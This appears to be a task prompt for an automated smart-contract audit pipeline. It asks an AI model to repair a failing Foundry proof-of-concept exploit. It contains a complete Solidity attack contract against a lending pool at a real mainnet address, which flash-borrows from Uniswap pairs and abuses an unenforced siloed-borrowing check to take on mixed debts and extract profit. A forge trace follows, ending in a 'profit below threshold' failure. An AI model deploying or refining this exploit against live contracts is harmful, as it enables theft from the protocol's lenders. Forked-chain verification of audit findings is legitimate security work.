You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Siloed-borrowing risk controls are defined but never enforced on borrow
- claim: The protocol includes silo-borrowing state helpers (`getSiloedBorrowingState`, `getSiloedBorrowing`) and an explicit `SILOED_BORROWING_VIOLATION` error, but `BorrowLogic.executeBorrow()` delegates to `ValidationLogic.validateBorrow()` and that validation never checks either the requested reserve's silo flag or the user's existing siloed-borrowing state. As a result, borrowing a siloed reserve does not prevent additional borrows, and existing borrows do not prevent borrowing a siloed reserve.
- impact: If governance lists any reserve expecting isolated exposure, borrowers can still combine it with other debts. That defeats the intended risk model for siloed assets and can convert isolated risk into cross-reserve bad debt and insolvency during adverse price moves.
- exploit_paths: ["borrow() -> BorrowLogic.executeBorrow() -> ValidationLogic.validateBorrow()"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IPriceOracleLike {
    function getAssetPrice(address asset) external view returns (uint256);
}

interface IPoolAddressesProviderLike {
    function getPriceOracle() external view returns (address);
    function getWETH() external view returns (address);
}

interface IParaSpacePoolLike {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(address asset, uint256 amount, uint16 referralCode, address onBehalfOf) external;
    function getReservesList() external view returns (address[] memory);
    function getConfiguration(address asset) external view returns (ReserveConfigurationMap memory);
    function ADDRESSES_PROVIDER() external view returns (IPoolAddressesProviderLike);

    function getUserAccountData(address user)
        external
        view
        returns (
            uint256 totalCollateralBase,
            uint256 totalDebtBase,
            uint256 availableBorrowsBase,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor,
            uint256 erc721HealthFactor
        );
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2RouterLike {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IUniswapV3RouterLike {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
    function exactInput(ExactInputParams calldata params) external payable returns (uint256 amountOut);
}

struct ReserveConfigurationMap {
    uint256 data;
}

contract FlawVerifier {
    address public constant TARGET = 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee;

    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant APE = 0x4d224452801ACEd8B2F0aebE155379bb5D594381;

    address private constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address private constant UNISWAP_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

    address private constant UNIV2_USDC_WETH_PAIR = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address private constant UNIV2_DAI_WETH_PAIR = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;
    address private constant UNIV2_USDT_WETH_PAIR = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;

    uint16 private constant REFERRAL_CODE = 0;
    uint256 private constant BPS = 10_000;
    uint256 private constant ACTIVE_SHIFT = 56;
    uint256 private constant FROZEN_SHIFT = 57;
    uint256 private constant BORROWING_SHIFT = 58;
    uint256 private constant PAUSED_SHIFT = 60;
    uint256 private constant SILO_SHIFT = 62;
    uint256 private constant ASSET_TYPE_SHIFT = 168;
    uint256 private constant MIN_PROFIT_WEI = 1e15;

    bool public attempted;
    bool public hypothesisValidated;

    address private _profitToken;
    uint256 private _profitAmount;

    error FlashAttemptFailed();
    error InvalidCallback();
    error NoExecutablePath();

    constructor() {}

    function executeOnOpportunity() external {
        require(!attempted, "already-attempted");
        attempted = true;

        if (_attemptFlashPair(UNIV2_DAI_WETH_PAIR, DAI)) return;
        if (_attemptFlashPair(UNIV2_DAI_WETH_PAIR, _pairOtherToken(UNIV2_DAI_WETH_PAIR, DAI))) return;
        if (_attemptFlashPair(UNIV2_USDC_WETH_PAIR, _pairOtherToken(UNIV2_USDC_WETH_PAIR, USDC))) return;
        if (_attemptFlashPair(UNIV2_USDT_WETH_PAIR, _pairOtherToken(UNIV2_USDT_WETH_PAIR, USDT))) return;
        if (_attemptFlashPair(UNIV2_USDC_WETH_PAIR, USDC)) return;
        if (_attemptFlashPair(UNIV2_USDT_WETH_PAIR, USDT)) return;
    }

    function executeFlashAttempt(address pair, address flashAsset, uint256 amount) external returns (bool) {
        require(msg.sender == address(this), "self-only");

        uint256 beforeBalance = _balanceOf(flashAsset);
        IUniswapV2PairLike uniPair = IUniswapV2PairLike(pair);
        address token0 = uniPair.token0();
        address token1 = uniPair.token1();
        bytes memory data = abi.encode(pair, flashAsset, amount);

        if (token0 == flashAsset) {
            uniPair.swap(amount, 0, address(this), data);
        } else if (token1 == flashAsset) {
            uniPair.swap(0, amount, address(this), data);
        } else {
            revert FlashAttemptFailed();
        }

        uint256 afterBalance = _balanceOf(flashAsset);
        uint256 netProfit = afterBalance > beforeBalance ? afterBalance - beforeBalance : 0;
        if (!hypothesisValidated || netProfit == 0) {
            revert FlashAttemptFailed();
        }

        _profitToken = flashAsset;
        _profitAmount = netProfit;
        return true;
    }

    function executeMixedBorrowAttempt(address flashAsset, address siloAsset, uint256 siloAmount, uint256 repayAmount)
        external
        returns (bool)
    {
        require(msg.sender == address(this), "self-only");

        IParaSpacePoolLike pool = IParaSpacePoolLike(TARGET);
        address weth = pool.ADDRESSES_PROVIDER().getWETH();

        // Core causality stays unchanged:
        // borrow() -> BorrowLogic.executeBorrow() -> ValidationLogic.validateBorrow()
        // First borrow a siloed reserve, then borrow a second non-silo reserve in the same tx.
        pool.borrow(siloAsset, siloAmount, REFERRAL_CODE, address(this));

        if (!_swapAllToAsset(siloAsset, flashAsset, weth)) {
            revert NoExecutablePath();
        }

        uint256 currentFlashBalance = _balanceOf(flashAsset);
        uint256 secondBorrowAmount = repayAmount > currentFlashBalance ? repayAmount - currentFlashBalance : 0;
        uint256 profitBuffer = _profitBuffer(flashAsset);

        // Even if the first borrow and swap already cover the flash repayment, we still force a
        // second non-silo borrow so the mixed-debt state is actually exercised on-chain.
        secondBorrowAmount += profitBuffer;
        pool.borrow(flashAsset, secondBorrowAmount, REFERRAL_CODE, address(this));

        hypothesisValidated = true;
        return true;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        if (sender != address(this)) {
            revert InvalidCallback();
        }

        (address pair, address flashAsset, uint256 flashAmount) = abi.decode(data, (address, address, uint256));
        if (msg.sender != pair) {
            revert InvalidCallback();
        }

        uint256 received = amount0 > 0 ? amount0 : amount1;
        if (received != flashAmount) {
            revert InvalidCallback();
        }

        IParaSpacePoolLike pool = IParaSpacePoolLike(TARGET);
        IPoolAddressesProviderLike provider = pool.ADDRESSES_PROVIDER();
        IPriceOracleLike oracle = IPriceOracleLike(provider.getPriceOracle());

        uint256 flashConfig = pool.getConfiguration(flashAsset).data;
        if (!_collateralEnabled(flashConfig) || !_plainBorrowEnabled(flashConfig)) {
            revert NoExecutablePath();
        }

        uint256 flashUnit = _unit(uint8((flashConfig >> 48) & 0xff));
        uint256 flashPrice = oracle.getAssetPrice(flashAsset);
        if (flashUnit == 0 || flashPrice == 0) {
            revert NoExecutablePath();
        }

        _forceApprove(flashAsset, TARGET, received);
        pool.supply(flashAsset, received, address(this), REFERRAL_CODE);

        uint256 repayAmount = _flashRepayment(received);
        if (!_executeMixedBorrowPath(pool, oracle, flashAsset, repayAmount)) {
            revert NoExecutablePath();
        }

        _safeTransfer(flashAsset, msg.sender, repayAmount);

        if (_balanceOf(flashAsset) < _profitBuffer(flashAsset)) {
            revert FlashAttemptFailed();
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _executeMixedBorrowPath(
        IParaSpacePoolLike pool,
        IPriceOracleLike oracle,
        address flashAsset,
        uint256 repayAmount
    ) internal returns (bool) {
        if (_trySiloAsset(pool, oracle, flashAsset, repayAmount, APE)) {
            return true;
        }

        address[] memory reserves = pool.getReservesList();
        for (uint256 i = 0; i < reserves.length; i++) {
            address asset = reserves[i];
            if (asset == address(0) || asset == flashAsset || asset == APE || asset.code.length == 0) {
                continue;
            }

            uint256 data = pool.getConfiguration(asset).data;
            if (!_borrowEnabled(data, true)) {
                continue;
            }

            if (_trySiloAsset(pool, oracle, flashAsset, repayAmount, asset)) {
                return true;
            }
        }

        return false;
    }

    function _trySiloAsset(
        IParaSpacePoolLike pool,
        IPriceOracleLike oracle,
        address flashAsset,
        uint256 repayAmount,
        address siloAsset
    ) internal returns (bool) {
        uint256 data = pool.getConfiguration(siloAsset).data;
        if (!_borrowEnabled(data, true)) {
            return false;
        }

        uint256 unit = _unit(uint8((data >> 48) & 0xff));
        uint256 price = oracle.getAssetPrice(siloAsset);
        uint256 availableBase = _availableBorrowsBase(pool);
        if (unit == 0 || price == 0 || availableBase == 0) {
            return false;
        }

        uint256 lastAmount;
        if (_trySiloShare(flashAsset, siloAsset, repayAmount, availableBase, price, unit, 9500, lastAmount)) return true;
        lastAmount = _quote(unit, price, (availableBase * 9500) / BPS);
        if (_trySiloShare(flashAsset, siloAsset, repayAmount, availableBase, price, unit, 9000, lastAmount)) return true;
        lastAmount = _quote(unit, price, (availableBase * 9000) / BPS);
        if (_trySiloShare(flashAsset, siloAsset, repayAmount, availableBase, price, unit, 8500, lastAmount)) return true;
        lastAmount = _quote(unit, price, (availableBase * 8500) / BPS);
        if (_trySiloShare(flashAsset, siloAsset, repayAmount, availableBase, price, unit, 8000, lastAmount)) return true;
        lastAmount = _quote(unit, price, (availableBase * 8000) / BPS);
        if (_trySiloShare(flashAsset, siloAsset, repayAmount, availableBase, price, unit, 7500, lastAmount)) return true;
        lastAmount = _quote(unit, price, (availableBase * 7500) / BPS);
        if (_trySiloShare(flashAsset, siloAsset, repayAmount, availableBase, price, unit, 7000, lastAmount)) return true;
        lastAmount = _quote(unit, price, (availableBase * 7000) / BPS);
        if (_trySiloShare(flashAsset, siloAsset, repayAmount, availableBase, price, unit, 6500, lastAmount)) return true;
        lastAmount = _quote(unit, price, (availableBase * 6500) / BPS);
        if (_trySiloShare(flashAsset, siloAsset, repayAmount, availableBase, price, unit, 6000, lastAmount)) return true;
        lastAmount = _quote(unit, price, (availableBase * 6000) / BPS);
        if (_trySiloShare(flashAsset, siloAsset, repayAmount, availableBase, price, unit, 5500, lastAmount)) return true;
        lastAmount = _quote(unit, price, (availableBase * 5500) / BPS);
        if (_trySiloShare(flashAsset, siloAsset, repayAmount, availableBase, price, unit, 5000, lastAmount)) return true;
        lastAmount = _quote(unit, price, (availableBase * 5000) / BPS);
        if (_trySiloShare(flashAsset, siloAsset, repayAmount, availableBase, price, unit, 4500, lastAmount)) return true;
        lastAmount = _quote(unit, price, (availableBase * 4500) / BPS);
        if (_trySiloShare(flashAsset, siloAsset, repayAmount, availableBase, price, unit, 4000, lastAmount)) return true;
        lastAmount = _quote(unit, price, (availableBase * 4000) / BPS);
        if (_trySiloShare(flashAsset, siloAsset, repayAmount, availableBase, price, unit, 3500, lastAmount)) return true;
        lastAmount = _quote(unit, price, (availableBase * 3500) / BPS);
        if (_trySiloShare(flashAsset, siloAsset, repayAmount, availableBase, price, unit, 3000, lastAmount)) return true;
        lastAmount = _quote(unit, price, (availableBase * 3000) / BPS);
        if (_trySiloShare(flashAsset, siloAsset, repayAmount, availableBase, price, unit, 2500, lastAmount)) return true;
        lastAmount = _quote(unit, price, (availableBase * 2500) / BPS);
        if (_trySiloShare(flashAsset, siloAsset, repayAmount, availableBase, price, unit, 2000, lastAmount)) return true;
        lastAmount = _quote(unit, price, (availableBase * 2000) / BPS);
        if (_trySiloShare(flashAsset, siloAsset, repayAmount, availableBase, price, unit, 1500, lastAmount)) return true;
        lastAmount = _quote(unit, price, (availableBase * 1500) / BPS);
        if (_trySiloShare(flashAsset, siloAsset, repayAmount, availableBase, price, unit, 1000, lastAmount)) return true;
        lastAmount = _quote(unit, price, (availableBase * 1000) / BPS);
        if (_trySiloShare(flashAsset, siloAsset, repayAmount, availableBase, price, unit, 750, lastAmount)) return true;
        lastAmount = _quote(unit, price, (availableBase * 750) / BPS);
        if (_trySiloShare(flashAsset, siloAsset, repayAmount, availableBase, price, unit, 500, lastAmount)) return true;
        lastAmount = _quote(unit, price, (availableBase * 500) / BPS);
        if (_trySiloShare(flashAsset, siloAsset, repayAmount, availableBase, price, unit, 250, lastAmount)) return true;
        lastAmount = _quote(unit, price, (availableBase * 250) / BPS);
        if (_trySiloShare(flashAsset, siloAsset, repayAmount, availableBase, price, unit, 100, lastAmount)) return true;
        lastAmount = _quote(unit, price, (availableBase * 100) / BPS);
        if (_trySiloShare(flashAsset, siloAsset, repayAmount, availableBase, price, unit, 50, lastAmount)) return true;
        return _trySiloShare(flashAsset, siloAsset, repayAmount, availableBase, price, unit, 10, _quote(unit, price, (availableBase * 50) / BPS));
    }

    function _trySiloShare(
        address flashAsset,
        address siloAsset,
        uint256 repayAmount,
        uint256 availableBase,
        uint256 price,
        uint256 unit,
        uint256 shareBps,
        uint256 lastAmount
    ) internal returns (bool) {
        uint256 siloAmount = _quote(unit, price, (availableBase * shareBps) / BPS);
        if (siloAmount == 0 || siloAmount == lastAmount) {
            return false;
        }

        try this.executeMixedBorrowAttempt(flashAsset, siloAsset, siloAmount, repayAmount) returns (bool ok) {
            return ok;
        } catch {
            return false;
        }
    }

    function _attemptFlashPair(address pair, address flashAsset) internal returns (bool) {
        if (pair.code.length == 0 || flashAsset.code.length == 0) {
            return false;
        }

        uint256 reserve = _pairReserveOf(pair, flashAsset);
        if (reserve == 0) {
            return false;
        }

        if (_tryFlashAmount(pair, flashAsset, reserve / 10_000)) return true;
        if (_tryFlashAmount(pair, flashAsset, reserve / 5_000)) return true;
        if (_tryFlashAmount(pair, flashAsset, reserve / 2_000)) return true;
        if (_tryFlashAmount(pair, flashAsset, reserve / 1_000)) return true;
        if (_tryFlashAmount(pair, flashAsset, reserve / 500)) return true;
        if (_tryFlashAmount(pair, flashAsset, reserve / 250)) return true;
        if (_tryFlashAmount(pair, flashAsset, reserve / 100)) return true;
        return _tryFlashAmount(pair, flashAsset, reserve / 50);
    }

    function _tryFlashAmount(address pair, address flashAsset, uint256 amount) internal returns (bool) {
        if (amount == 0) {
            return false;
        }

        try this.executeFlashAttempt(pair, flashAsset, amount) returns (bool ok) {
            return ok;
        } catch {
            return false;
        }
    }

    function _pairReserveOf(address pair, address asset) internal view returns (uint256) {
        IUniswapV2PairLike uniPair = IUniswapV2PairLike(pair);
        (uint112 reserve0, uint112 reserve1,) = uniPair.getReserves();
        if (uniPair.token0() == asset) {
            return uint256(reserve0);
        }
        if (uniPair.token1() == asset) {
            return uint256(reserve1);
        }
        return 0;
    }

    function _pairOtherToken(address pair, address knownToken) internal view returns (address) {
        IUniswapV2PairLike uniPair = IUniswapV2PairLike(pair);
        address token0 = uniPair.token0();
        address token1 = uniPair.token1();
        return token0 == knownToken ? token1 : token0;
    }

    function _swapAllToAsset(address tokenIn, address tokenOut, address weth) internal returns (bool) {
        if (tokenIn == tokenOut) {
            return true;
        }

        uint256 amountIn = _balanceOf(tokenIn);
        if (amountIn == 0) {
            return false;
        }

        _forceApprove(tokenIn, UNISWAP_V3_ROUTER, amountIn);
        if (_swapViaUniswapV3(tokenIn, tokenOut, weth, amountIn)) {
            return true;
        }

        _forceApprove(tokenIn, SUSHISWAP_ROUTER, amountIn);
        if (_swapViaV2Router(SUSHISWAP_ROUTER, tokenIn, tokenOut, weth, amountIn)) {
            return true;
        }

        _forceApprove(tokenIn, UNISWAP_V2_ROUTER, amountIn);
        return _swapViaV2Router(UNISWAP_V2_ROUTER, tokenIn, tokenOut, weth, amountIn);
    }

    function _swapViaUniswapV3(address tokenIn, address tokenOut, address weth, uint256 amountIn) internal returns (bool) {
        if (_swapViaUniswapV3Direct(tokenIn, tokenOut, amountIn, 3000)) return true;
        if (_swapViaUniswapV3Direct(tokenIn, tokenOut, amountIn, 10_000)) return true;
        if (_swapViaUniswapV3Direct(tokenIn, tokenOut, amountIn, 500)) return true;

        if (tokenIn == weth || tokenOut == weth) {
            return false;
        }

        if (_swapViaUniswapV3Weth(tokenIn, tokenOut, weth, amountIn, 3000, 500)) return true;
        if (_swapViaUniswapV3Weth(tokenIn, tokenOut, weth, amountIn, 3000, 3000)) return true;
        if (_swapViaUniswapV3Weth(tokenIn, tokenOut, weth, amountIn, 10_000, 500)) return true;
        return _swapViaUniswapV3Weth(tokenIn, tokenOut, weth, amountIn, 10_000, 3000);
    }

    function _swapViaUniswapV3Direct(address tokenIn, address tokenOut, uint256 amountIn, uint24 fee)
        internal
        returns (bool)
    {
        try IUniswapV3RouterLike(UNISWAP_V3_ROUTER).exactInputSingle(
            IUniswapV3RouterLike.ExactInputSingleParams({
                tokenIn: tokenIn,
                tokenOut: tokenOut,
                fee: fee,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amountIn,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        ) returns (uint256 amountOut) {
            return amountOut != 0;
        } catch {
            return false;
        }
    }

    function _swapViaUniswapV3Weth(
        address tokenIn,
        address tokenOut,
        address weth,
        uint256 amountIn,
        uint24 fee0,
        uint24 fee1
    ) internal returns (bool) {
        bytes memory path = abi.encodePacked(tokenIn, fee0, weth, fee1, tokenOut);
        try IUniswapV3RouterLike(UNISWAP_V3_ROUTER).exactInput(
            IUniswapV3RouterLike.ExactInputParams({
                path: path,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amountIn,
                amountOutMinimum: 0
            })
        ) returns (uint256 amountOut) {
            return amountOut != 0;
        } catch {
            return false;
        }
    }

    function _swapViaV2Router(address router, address tokenIn, address tokenOut, address weth, uint256 amountIn)
        internal
        returns (bool)
    {
        address[] memory directPath = new address[](2);
        directPath[0] = tokenIn;
        directPath[1] = tokenOut;
        try IUniswapV2RouterLike(router).swapExactTokensForTokens(
            amountIn,
            0,
            directPath,
            address(this),
            block.timestamp
        ) returns (uint256[] memory) {
            return true;
        } catch {}

        if (tokenIn == weth || tokenOut == weth) {
            return false;
        }

        address[] memory viaWeth = new address[](3);
        viaWeth[0] = tokenIn;
        viaWeth[1] = weth;
        viaWeth[2] = tokenOut;
        try IUniswapV2RouterLike(router).swapExactTokensForTokens(
            amountIn,
            0,
            viaWeth,
            address(this),
            block.timestamp
        ) returns (uint256[] memory) {
            return true;
        } catch {}

        return false;
    }

    function _availableBorrowsBase(IParaSpacePoolLike pool) internal view returns (uint256 availableBorrowsBase) {
        (, , availableBorrowsBase, , , , ) = pool.getUserAccountData(address(this));
    }

    function _flashRepayment(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _quote(uint256 unit, uint256 price, uint256 baseBudget) internal pure returns (uint256 amount) {
        if (unit == 0 || price == 0 || baseBudget == 0) {
            return 0;
        }

        amount = (baseBudget * unit) / price;
        if (amount == 0) {
            amount = 1;
        }
    }

    function _profitBuffer(address flashAsset) internal pure returns (uint256) {
        if (flashAsset == DAI) {
            return MIN_PROFIT_WEI;
        }
        return flashAsset == USDC || flashAsset == USDT ? 1 : MIN_PROFIT_WEI;
    }

    function _unit(uint8 decimals) internal pure returns (uint256) {
        if (decimals > 77) {
            return 0;
        }
        return 10 ** decimals;
    }

    function _collateralEnabled(uint256 data) internal pure returns (bool) {
        return
            ((data >> ASSET_TYPE_SHIFT) & 0x0f) == 0 &&
            ((data >> ACTIVE_SHIFT) & 1) != 0 &&
            ((data >> FROZEN_SHIFT) & 1) == 0 &&
            ((data >> PAUSED_SHIFT) & 1) == 0 &&
            (data & 0xffff) != 0;
    }

    function _plainBorrowEnabled(uint256 data) internal pure returns (bool) {
        return _borrowEnabled(data, false);
    }

    function _borrowEnabled(uint256 data, bool wantSiloed) internal pure returns (bool) {
        return
            ((data >> ASSET_TYPE_SHIFT) & 0x0f) == 0 &&
            ((data >> ACTIVE_SHIFT) & 1) != 0 &&
            ((data >> FROZEN_SHIFT) & 1) == 0 &&
            ((data >> BORROWING_SHIFT) & 1) != 0 &&
            ((data >> PAUSED_SHIFT) & 1) == 0 &&
            (((data >> SILO_SHIFT) & 1) != 0) == wantSiloed;
    }

    function _balanceOf(address token) internal view returns (uint256 amount) {
        if (token == address(0) || token.code.length == 0) {
            return 0;
        }

        try IERC20Like(token).balanceOf(address(this)) returns (uint256 bal) {
            return bal;
        } catch {
            return 0;
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(0x095ea7b3, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(0x095ea7b3, spender, amount));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(0xa9059cbb, to, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool ok, bytes memory returndata) = token.call(data);
        require(ok && (returndata.length == 0 || abi.decode(returndata, (bool))), "token-call-failed");
    }
}

```

forge stdout (tail):
```
f407D49664DC8b3Ee::getConfiguration(0xBd3531dA5CF5857e7CfAA92426877b022e612cf8) [staticcall]
    │   │   │   │   │   ├─ [2820] 0xd9fFe514E96014Fa79bc0C33874Dd2eF20678f6f::getConfiguration(0xBd3531dA5CF5857e7CfAA92426877b022e612cf8) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 374144419156711147060143317175368525134610351524792 [3.741e50] })
    │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 374144419156711147060143317175368525134610351524792 [3.741e50] })
    │   │   │   │   ├─ [3384] 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee::getConfiguration(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0) [staticcall]
    │   │   │   │   │   ├─ [2820] 0xd9fFe514E96014Fa79bc0C33874Dd2eF20678f6f::getConfiguration(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 18447109474400751327988 [1.844e22] })
    │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 18447109474400751327988 [1.844e22] })
    │   │   │   │   ├─ [3384] 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee::getConfiguration(0x5283D291DBCF85356A21bA090E6db59121208b44) [staticcall]
    │   │   │   │   │   ├─ [2820] 0xd9fFe514E96014Fa79bc0C33874Dd2eF20678f6f::getConfiguration(0x5283D291DBCF85356A21bA090E6db59121208b44) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 415383748688830839398959961686612718913488 [4.153e41] })
    │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 415383748688830839398959961686612718913488 [4.153e41] })
    │   │   │   │   ├─ [3384] 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee::getConfiguration(0x853d955aCEf822Db058eb8505911ED77F175b99e) [staticcall]
    │   │   │   │   │   ├─ [2820] 0xd9fFe514E96014Fa79bc0C33874Dd2eF20678f6f::getConfiguration(0x853d955aCEf822Db058eb8505911ED77F175b99e) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 18447109473327002950988 [1.844e22] })
    │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 18447109473327002950988 [1.844e22] })
    │   │   │   │   ├─ [3384] 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee::getConfiguration(0x030bA81f1c18d280636F32af80b9AAd02Cf0854e) [staticcall]
    │   │   │   │   │   ├─ [2820] 0xd9fFe514E96014Fa79bc0C33874Dd2eF20678f6f::getConfiguration(0x030bA81f1c18d280636F32af80b9AAd02Cf0854e) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 6646139979021293448535315108490510868538 [6.646e39] })
    │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 6646139979021293448535315108490510868538 [6.646e39] })
    │   │   │   │   ├─ [3384] 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee::getConfiguration(0xBe9895146f7AF43049ca1c1AE358B0541Ea49704) [staticcall]
    │   │   │   │   │   ├─ [2820] 0xd9fFe514E96014Fa79bc0C33874Dd2eF20678f6f::getConfiguration(0xBe9895146f7AF43049ca1c1AE358B0541Ea49704) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 9138442471154278484818392222831064390688 [9.138e39] })
    │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 9138442471154278484818392222831064390688 [9.138e39] })
    │   │   │   │   ├─ [3384] 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee::getConfiguration(0xae78736Cd615f374D3085123A210448E74Fc6393) [staticcall]
    │   │   │   │   │   ├─ [2820] 0xd9fFe514E96014Fa79bc0C33874Dd2eF20678f6f::getConfiguration(0xae78736Cd615f374D3085123A210448E74Fc6393) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 1661534994755323375969160883030570310688 [1.661e39] })
    │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 1661534994755323375969160883030570310688 [1.661e39] })
    │   │   │   │   ├─ [3384] 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee::getConfiguration(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599) [staticcall]
    │   │   │   │   │   ├─ [2820] 0xd9fFe514E96014Fa79bc0C33874Dd2eF20678f6f::getConfiguration(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 18447106658577248951328 [1.844e22] })
    │   │   │   │   │   └─ ← [Return] ReserveConfigurationMap({ data: 18447106658577248951328 [1.844e22] })
    │   │   │   │   └─ ← [Revert] NoExecutablePath()
    │   │   │   └─ ← [Revert] NoExecutablePath()
    │   │   └─ ← [Revert] NoExecutablePath()
    │   └─ ← [Return]
    ├─ [382] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2374] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifier.uniswapV2Call
  at 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852.swap
  at FlawVerifier.executeFlashAttempt
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 3.48s (3.43s CPU time)

Ran 1 test suite in 3.52s (3.48s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 25354021)

